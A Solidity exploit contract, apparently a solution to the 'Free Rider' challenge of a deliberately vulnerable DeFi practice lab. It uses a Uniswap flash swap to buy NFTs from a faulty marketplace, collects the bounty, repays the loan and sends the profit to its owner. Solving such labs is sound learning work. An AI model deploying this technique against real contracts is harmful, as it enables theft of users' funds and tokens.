// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IWETH {
  function withdraw(uint amount) external;
  function deposit() external payable;
  function transfer(address, uint) external;
}

interface IMarketplace {
  function buyMany(uint256[] calldata tokenIds) external payable;
}



contract AttackFreeRider is IERC721Receiver, IUniswapV2Callee{
  address owner;
  address pair;
  IWETH WETH;
  IMarketplace marketplace;
  IERC721 nft;
  address buyer;

  constructor(address nftAddress, address marketplaceAddress, address pairAddress, address wethAddress, address buyerAddress) {
    owner = msg.sender;
    marketplace = IMarketplace(marketplaceAddress);
    WETH = IWETH(wethAddress);
    pair = pairAddress;
    nft = IERC721(nftAddress);
    buyer = buyerAddress;
  }

  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override{
    require(msg.sender == pair);
    require(sender == address(this));

    uint amount = amount0; //amount0 is WETH
    uint fee = ((amount * 3) / 997) + 1;
    uint repayAmount = amount + fee;

    (uint256 price, uint256[] memory tokenIds) = abi.decode(data, (uint256, uint256[]));

   // Turn it into ETH so we can buy from marketplace
    WETH.withdraw(amount);

    // Buy all the NFTs and get paid out as the seller.
    marketplace.buyMany{value: price}(tokenIds);

    // Send them all to the buyer for bounty.
    for(uint i=0; i < tokenIds.length; i++){
      nft.safeTransferFrom(address(this), buyer, tokenIds[i]);
    }

    // Repay the loan.
    // Turn it back into WETH0
    WETH.deposit{value: repayAmount}();
    WETH.transfer(pair, repayAmount);

    // Send remaining ETH back to attacker.
    payable(owner).transfer(address(this).balance);
  }



  function attack(uint256 price, uint256[] calldata tokenIds) external {
    bytes memory data = abi.encode(price, tokenIds);
    IUniswapV2Pair(pair).swap(price, 0, address(this), data);
  }

  receive() external payable {}

  function onERC721Received(
      address,
      address,
      uint256 _tokenId,
      bytes memory
  )
      external
      override
      returns (bytes4)
  {
        return IERC721Receiver.onERC721Received.selector;
  }

}
